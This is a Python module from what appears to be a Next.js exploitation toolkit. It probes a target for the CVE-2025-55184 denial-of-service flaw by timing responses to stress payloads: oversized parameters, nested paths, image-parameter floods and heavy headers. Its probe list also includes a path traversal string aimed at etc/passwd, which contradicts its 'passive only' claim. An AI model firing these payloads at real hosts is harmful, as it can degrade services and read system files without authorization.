#!/usr/bin/env python3
"""
NextSploit — CVE-2025-55184: Denial of Service (Passive Detection)
[NEW MODULE]

Passive detection of DoS vulnerability in Next.js < 14.2.35.
This module does NOT perform actual DoS — only probes for indicators.
Affected: Next.js < 14.2.35
"""

import time
import statistics
import requests

from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, print_module_header, print_finding,
    create_progress,
)

CVE_ID = "CVE-2025-55184"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Paths known to cause excessive resource consumption
DOS_PROBE_PATHS = [
    # Large RSC payloads
    ("/_next/data/{buildid}/index.json", "RSC data endpoint"),
    # Deeply nested dynamic routes
    ("/a/" * 50, "Deep nested path"),
    # Large query strings
    ("/?_rsc=" + "A" * 5000, "Large RSC parameter"),
    # Multiple middleware triggers
    ("/api/auth/" + "../" * 20 + "etc/passwd", "Path traversal trigger"),
    # Image optimization abuse
    ("/_next/image?url=x&w=99999&q=100", "Image optimization oversized"),
    ("/_next/image?url=x&w=1&q=1&" + "x=y&" * 500, "Image optimization params flood"),
]

# Headers that might trigger excessive processing
DOS_HEADERS = [
    {"Accept-Encoding": "gzip, deflate, br, zstd, " * 50},
    {"Cookie": "session=" + "A" * 8000},
    {"X-Forwarded-For": ", ".join([f"10.0.0.{i}" for i in range(200)])},
]

# Response time thresholds (in seconds)
NORMAL_THRESHOLD = 2.0    # Expected normal response time
ANOMALY_THRESHOLD = 5.0   # Something may be wrong
CRITICAL_THRESHOLD = 10.0 # Definite resource exhaustion indicator


def scan(config: ScanConfig) -> ModuleResult:
    """
    Passive DoS detection for CVE-2025-55184.
    
    Phase 1: Establish baseline response time
    Phase 2: Probe with DoS indicator payloads
    Phase 3: Test resource-intensive headers
    
    NOTE: This does NOT perform actual DoS attacks.
    """
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status="NOT VULNERABLE",
    )

    print_module_header(CVE_ID, CVE_INFO["title"], CVE_INFO["severity"])
    session = config.create_session()
    target = config.target.rstrip("/")

    log_info("⚠ This module performs PASSIVE detection only — no actual DoS")
    log_info(f"Fix version: {CVE_INFO['fix_version']}")

    # ════════════════════════════════════════════════════════════════════
    # Phase 1: Establish baseline
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 1] Establishing baseline response time...")

    baseline_times = []
    for _ in range(3):
        try:
            start = time.time()
            r = session.get(target, timeout=config.timeout)
            elapsed = time.time() - start
            baseline_times.append(elapsed)
            log_debug(f"Baseline request: {elapsed:.3f}s (status {r.status_code})")
        except requests.RequestException as e:
            log_error(f"Baseline request failed: {e}")

    if not baseline_times:
        log_error("Cannot establish baseline — target unreachable")
        result.status = "ERROR"
        result.error = "Target unreachable"
        return result

    baseline_avg = statistics.mean(baseline_times)
    baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0
    log_info(f"Baseline: avg={baseline_avg:.3f}s, stdev={baseline_stdev:.3f}s")

    # ════════════════════════════════════════════════════════════════════
    # Phase 2: DoS indicator probes
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 2] Probing DoS indicator paths...")

    # Try to get build ID for path substitution
    try:
        r_main = session.get(target, timeout=config.timeout)
        import re
        build_ids = re.findall(r'/_next/static/([a-zA-Z0-9_-]{8,})/', r_main.text)
        build_id = max(set(build_ids), key=build_ids.count) if build_ids else "unknown"
    except Exception:
        build_id = "unknown"

    with create_progress() as progress:
        task = progress.add_task("DoS Indicator Probe", total=len(DOS_PROBE_PATHS))

        for path_template, desc in DOS_PROBE_PATHS:
            progress.update(task, advance=1)

            path = path_template.replace("{buildid}", build_id)
            url = f"{target}{path[:2000]}"  # Limit URL length

            try:
                start = time.time()
                r = session.get(url, timeout=max(config.timeout, 15))
                elapsed = time.time() - start

                log_debug(f"[{r.status_code}] {desc}: {elapsed:.3f}s")

                # Compare to baseline
                time_ratio = elapsed / baseline_avg if baseline_avg > 0 else 0

                if elapsed > CRITICAL_THRESHOLD or time_ratio > 5:
                    detail = (
                        f"Critical response delay: {desc} took {elapsed:.2f}s "
                        f"(baseline: {baseline_avg:.2f}s, {time_ratio:.1f}x slower)"
                    )
                    log_critical(detail)

                    evidence = {
                        "path": path[:200],
                        "description": desc,
                        "response_time": f"{elapsed:.3f}s",
                        "baseline_avg": f"{baseline_avg:.3f}s",
                        "slowdown_factor": f"{time_ratio:.1f}x",
                        "status_code": r.status_code,
                    }
                    print_finding(CVE_ID, detail, evidence)
                    result.add_finding(Finding(
                        cve=CVE_ID, severity="HIGH",
                        title="DoS Indicator: Excessive Response Time",
                        status="VULNERABLE", detail=detail,
                        evidence=evidence,
                    ))

                elif elapsed > ANOMALY_THRESHOLD or time_ratio > 3:
                    detail = (
                        f"Anomalous response time: {desc} took {elapsed:.2f}s "
                        f"(baseline: {baseline_avg:.2f}s, {time_ratio:.1f}x slower)"
                    )
                    log_warning(detail)

                    evidence = {
                        "path": path[:200],
                        "description": desc,
                        "response_time": f"{elapsed:.3f}s",
                        "baseline_avg": f"{baseline_avg:.3f}s",
                        "slowdown_factor": f"{time_ratio:.1f}x",
                    }
                    print_finding(CVE_ID, detail, evidence)
                    result.add_finding(Finding(
                        cve=CVE_ID, severity="MEDIUM",
                        title="DoS Indicator: Anomalous Response Time",
                        status="VULNERABLE", detail=detail,
                        evidence=evidence,
                    ))

            except requests.Timeout:
                detail = f"Request TIMEOUT on {desc} (>{config.timeout}s) — possible DoS vector"
                log_critical(detail)
                result.add_finding(Finding(
                    cve=CVE_ID, severity="HIGH",
                    title="DoS Indicator: Request Timeout",
                    status="VULNERABLE", detail=detail,
                    evidence={"path": path[:200], "description": desc, "timeout": f"{config.timeout}s"},
                ))

            except requests.RequestException as e:
                log_trace(f"Error probing {desc}: {e}")

    # ════════════════════════════════════════════════════════════════════
    # Phase 3: Resource-intensive headers
    # ════════════════════════════════════════════════════════════════════
    log_info("[Phase 3] Testing resource-intensive headers...")

    with create_progress() as progress:
        task = progress.add_task("Header Stress Probe", total=len(DOS_HEADERS))

        for header_payload in DOS_HEADERS:
            progress.update(task, advance=1)
            header_name = list(header_payload.keys())[0]

            try:
                start = time.time()
                r = session.get(
                    target,
                    headers=header_payload,
                    timeout=max(config.timeout, 15),
                )
                elapsed = time.time() - start

                time_ratio = elapsed / baseline_avg if baseline_avg > 0 else 0
                log_debug(f"Header {header_name}: {elapsed:.3f}s ({time_ratio:.1f}x)")

                if elapsed > ANOMALY_THRESHOLD or time_ratio > 3:
                    detail = (
                        f"Heavy header '{header_name}' caused {elapsed:.2f}s response "
                        f"({time_ratio:.1f}x baseline)"
                    )
                    log_warning(detail)
                    result.add_finding(Finding(
                        cve=CVE_ID, severity="MEDIUM",
                        title="DoS Indicator: Heavy Header Processing",
                        status="VULNERABLE", detail=detail,
                        evidence={
                            "header": header_name,
                            "response_time": f"{elapsed:.3f}s",
                            "slowdown_factor": f"{time_ratio:.1f}x",
                        },
                    ))

            except requests.Timeout:
                detail = f"TIMEOUT with heavy '{header_name}' header"
                log_warning(detail)
                result.add_finding(Finding(
                    cve=CVE_ID, severity="MEDIUM",
                    title="DoS Indicator: Header Timeout",
                    status="VULNERABLE", detail=detail,
                    evidence={"header": header_name},
                ))

            except requests.RequestException:
                pass

    # ── Final status ─────────────────────────────────────────────────────
    if result.finding_count > 0:
        log_warning(f"Found {result.finding_count} DoS indicators (passive detection)")
    else:
        log_success("No DoS indicators detected")

    return result
